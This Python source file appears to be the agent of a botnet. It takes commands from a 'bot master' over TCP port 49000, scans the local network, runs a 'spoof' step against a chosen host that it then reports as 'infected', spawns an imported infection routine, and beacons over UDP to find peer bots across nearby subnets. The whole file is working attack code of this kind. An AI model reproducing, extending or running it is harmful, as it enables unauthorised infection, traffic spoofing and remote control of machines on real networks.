import multiprocessing
import time
import enum
from infect import main_infect
import threading
import socket


# the protocol
class Types(enum.Enum):
    COMMAND = 1
    COMMAND_RESULT = 2


# convert requests to the valid operation
def convert(choice):
    if choice == "scan" or choice.find("scan:") != -1 or choice.find("spoof:") != -1 or choice == "get_tree":
        return Types.COMMAND
    elif choice == "scan_result" or choice == "scan_result:" or choice == "spoof_result" or choice == "tree_result":
        return Types.COMMAND_RESULT
    return None


# handles all the commands
def handle_command(data, clients):
    if data == "scan":
        parent_conn.send(data)
        clients = parent_conn.recv()
        # print("IP" + " " * 15 + "MAC")
        # if clients:
        #     for client in clients:
        #         print("{}   {}".format(client['ip'], client['mac']))
        # else:
        #     print("scan failed")
        choice = "scan_result"
        return clients, choice

    elif data.find("scan:") != -1:
        parent_conn.send(data)
        mac = parent_conn.recv()
        # print(mac)
        choice = "scan_result:"
        clients.append({'ip': data.split(":")[1], 'mac': mac})
        return mac, choice

    elif data.find("spoof:") != -1:
        chosen_ip = data.split(":")[1]
        chosen_mac = ""
        for client in clients:
            if client['ip'] == chosen_ip:
                chosen_mac = client['mac']
        parent_conn.send(data)
        parent_conn.send(chosen_ip)
        parent_conn.send(chosen_mac)
        result = parent_conn.recv()
        choice = "spoof_result"
        return result, choice

    elif data == "get_tree":
        choice = "tree_result"
        return lan_tree, choice


# handles all the command's results (sends back to the bot master)
def handle_command_result(sock, data, output):
    if data == "scan_result":
        if output:
            string = "IP" + " " * 15 + "MAC"
            for client in output:
                string += "\n" "{}   {}".format(client['ip'], client['mac'])
            print(string)
            sock.send(string.encode())
        else:
            sock.send("scan failed".encode())

    elif data == "scan_result:":
        sock.send(output.encode())

    elif data == "spoof_result":
        print("infected")

    elif data == "tree_result":
        hosts = ""
        for host in output:
            hosts += host + " "
        print(hosts)
        sock.send(hosts.encode())


# sends to the entire network message to check for other bots
def send_to_network():
    sender_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for host in ips:
            sender_udp.sendto("####".encode(), (host, 48000))
        time.sleep(30.0)


# listening for bots in the LAN and answering them
def recv_replies():
    receiver_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    receiver_udp.bind(("0.0.0.0", 48000))
    while True:
        (reply, remote_address) = receiver_udp.recvfrom(4)
        if reply.decode().find("#") != -1 and remote_address[0] not in lan_tree:
            lan_tree.append(remote_address[0])
            receiver_udp.sendto("####".encode(), (remote_address[0], 48000))


# prepares a list of ips to send them the bot message
def ip_list():
    ips = []
    my_ip = ip
    numbers = my_ip.split(".")
    third_digit = str(int(numbers[2]) - 2)
    fourth_digit = "0"

    if int(third_digit) < 0:
        third_digit = "0"

    while int(third_digit) <= int(numbers[2]) + 2:
        host = numbers[0] + "." + numbers[1] + "." + third_digit + "." + fourth_digit
        ips.append(host)
        if int(fourth_digit) < 255:
            fourth_digit = str(int(fourth_digit) + 1)
        else:
            third_digit = str(int(third_digit) + 1)
            fourth_digit = "0"

    return ips


def con_thread(sock, addr):
    choice = ""
    data = ""
    output = ""
    clients = []
    while True:
        if choice == "":
            choice = sock.recv(1024).decode()

        data = choice
        data_type = convert(choice)
        choice = ""

        if not data_type:
            print("invalid instruction")

        else:
            if data_type == Types.COMMAND:
                output, choice = handle_command(data, clients)
            elif data_type == Types.COMMAND_RESULT:
                handle_command_result(sock, data, output)


if __name__ == '__main__':
    # get ip
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()

    ips = ip_list()
    lan_tree = []

    send_thread = threading.Thread(target=send_to_network)
    recv_thread = threading.Thread(target=recv_replies)
    send_thread.start()
    recv_thread.start()

    can_infect = False
    # creating a duplex pipe for the IPC
    parent_conn, child_conn = multiprocessing.Pipe()

    # tries to spawn the infection process
    try:
        p1 = multiprocessing.Process(target=main_infect, args=(child_conn, ))
        p1.start()
        can_infect = True
    except Exception as ex:
        print(ex)

    if can_infect:
        print("can_infect")

    tcp_socket = socket.socket()
    tcp_socket.bind(("0.0.0.0", 49000))
    tcp_socket.listen()

    # waiting for command (later receives from bot master)
    while True:
        (client_socket, client_address) = tcp_socket.accept()
        con_th = threading.Thread(target=con_thread, args=(client_socket, client_address,))
        con_th.start()
